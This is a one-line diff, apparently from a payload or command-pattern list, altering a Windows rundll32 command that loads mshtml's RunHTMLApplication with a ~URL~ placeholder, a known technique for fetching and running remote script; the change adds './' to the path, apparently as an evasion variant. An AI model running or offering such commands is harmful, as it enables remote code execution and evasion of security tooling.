@@ -1,1 +1,1 @@
-rundll32.exe ~URL~\..\..\..\mshtml,RunHTMLApplication
+rundll32.exe ~URL~\..\..\..\./mshtml,RunHTMLApplication
